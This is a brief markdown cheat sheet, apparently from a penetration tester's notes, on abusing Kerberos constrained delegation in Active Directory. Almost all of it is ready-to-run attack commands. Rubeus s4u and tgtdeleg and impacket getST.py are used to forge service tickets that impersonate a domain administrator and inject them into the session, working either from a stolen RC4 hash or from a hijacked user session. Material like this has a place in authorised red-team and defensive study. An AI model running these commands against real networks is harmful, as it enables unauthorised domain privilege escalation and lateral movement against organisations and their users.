---
title: Constrained
tags:
  - "#activedirectory"
  - unconstrained
  - delegations
---
### s4u delegation
This attack is possible if `msds-AllowedToDelegateTo` is set.

* with rc4 hash in hand
```powershell
# Request TGT + TGS
Rubeus.exe s4u /user:attacker /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,host,http /domain:contoso.local /dc:dc01.contoso.local /ptt

# impacket
getST.py -spn cifs/TargetComputer.range.net 'range.net/FakeComputer$:newpassword123' -impersonate administrator -dc-ip 192.168.86.182
```

* with owned user session (not knowing his rc4)
```powershell
# Request for ticket
Rubeus.exe tgtdeleg /nowrap

# Request TGS with base64 blob ticket
Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
```